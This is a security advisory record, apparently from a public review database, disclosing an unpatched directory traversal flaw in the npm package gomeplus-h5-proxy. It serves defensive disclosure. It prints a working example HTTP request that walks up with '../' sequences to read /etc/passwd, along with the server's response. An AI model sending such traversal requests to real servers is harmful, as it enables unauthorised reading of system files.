---
Publication-State: Active
Access: Public
Reviewers:
- Name: Liang Gong
  Associated-With-Project: false
  Compensation-Source: external
Domain: Security
Methodology:
- Code-Review
Issues-Identified: Not-Examined
Package-URLs:
- pkg:npm/gomeplus-h5-proxy
Review-Date: '2017-06-05'
Scope: Implementation/Full
Schema-Version: '1.0'
SPDX-License-Identifier: CC-BY-4.0
---
### Summary
*Directory Traversal*<br><br>Recommendation: Because there is no fix for this module, we suggest using a different one.
### Details
`gomeplus-h5-proxy` is vulnerable to a directory traversal issue, allowing attackers to access any file in the system by placing '../' in the URL.  Example request: ``` GET /../../../../../../../../../../../../../../../etc/passwd HTTP/1.1 host: localhost ``` and response: ``` HTTP/1.1 200 OK Access-Control-Allow-Origin: * Date: Mon, 22 May 2017 21:29:51 GMT Connection: keep-alive Transfer-Encoding: chunked  {contents of /etc/passwd} ```
<br><br>• Affected Versions: <99.999.9999
<br>• Patched Versions: <0.0.0
### Methodology
This review was taken directly from the Security Advisories section of npm's official website.
### External References
['https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/gomeplus-h5-proxy)']
### Disclaimer
All security reviews are conducted on a "best-effort" basis against a software component at a point in time. We make no guarantee as to the quality or completeness of any review. If you believe any content is inaccurate, we encourage you to open an issue or submit a pull request with a correction or improvement.
### License
This text is released under at least the [Creative Commons Attribution 4.0 (CC-BY-4.0) license](https://creativecommons.org/licenses/by/4.0/legalcode.txt). Externally-referenced content may be licensed differently.
